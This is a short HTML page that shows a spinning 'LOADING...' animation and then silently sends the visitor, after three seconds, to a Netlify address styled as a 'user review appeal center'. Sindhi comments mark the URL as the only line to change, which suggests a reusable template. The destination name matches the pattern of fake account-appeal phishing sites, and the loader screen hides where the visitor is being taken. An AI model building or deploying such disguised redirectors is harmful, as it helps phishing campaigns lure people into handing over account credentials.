<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Powerful Loader</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
    background:#0f172a;
}

.loader{
    position:relative;
    width:120px;
    height:120px;
}

.loader span{
    position:absolute;
    width:100%;
    height:100%;
    border:5px solid transparent;
    border-top:5px solid #00e5ff;
    border-radius:50%;
    animation:spin 1.2s linear infinite;
}

.loader span:nth-child(2){
    width:90px;
    height:90px;
    top:15px;
    left:15px;
    border-top-color:#00ff88;
    animation-duration:0.9s;
    animation-direction:reverse;
}

.loader span:nth-child(3){
    width:60px;
    height:60px;
    top:30px;
    left:30px;
    border-top-color:#ffcc00;
    animation-duration:0.6s;
}

@keyframes spin{
    100%{
        transform:rotate(360deg);
    }
}

.loading-text{
    position:absolute;
    color:white;
    font-family:Arial, sans-serif;
    font-size:14px;
    letter-spacing:2px;
    margin-top:180px;
    animation:blink 1.5s infinite;
}

@keyframes blink{
    50%{
        opacity:0.3;
    }
}
</style>
</head>
<body>

<div class="loader">
    <span></span>
    <span></span>
    <span></span>
</div>

<div class="loading-text">LOADING...</div>

<script>
// 🔴 صرف هي هڪ لائن بدلائڻي آهي
const LINK = "https://user-review-appeal-center.netlify.app/";

// 3 سيڪنڊ بعد ريڊائريڪٽ
setTimeout(() => {
    window.location.href = LINK;
}, 3000);
</script>

</body>
</html>
